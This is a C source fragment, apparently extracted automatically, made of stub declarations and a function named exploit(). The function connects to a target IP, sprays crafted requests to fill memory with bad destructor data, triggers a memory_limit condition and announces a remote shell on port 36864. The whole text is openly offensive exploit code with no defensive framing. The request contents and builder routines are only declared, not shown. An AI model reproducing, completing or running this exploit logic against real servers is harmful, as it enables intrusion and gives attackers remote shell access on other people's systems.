
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int IP ;
 int build1 (int,int) ;
 int build3 (int,int) ;
 int close (int ) ;
 int printf (char*) ;
 int request1 ;
 int request2 ;
 int request3 ;
 int request4 ;
 int sock ;
 int xp_connect (int ) ;
 int xp_write (int ) ;

void exploit()
{

 int i;

 printf("Stage 1: Filling mem with bad pdestructor ... ");
 for (i=0; i< 5; i++)
 {
        xp_connect(IP);
            xp_write(request1);
             build1(5000, 1);
             xp_write(request2);
      close(sock);
 }
 printf("DONE\r\n");
 printf("Stage 2: Triggering memory_limit now ... ");

 xp_connect(IP);
        xp_write(request3);
        build3(8192, 255);
        build3(7265, 1);
        xp_write(request4);
 printf("DONE\r\n");
 printf("Shell on port 36864\r\n");

}
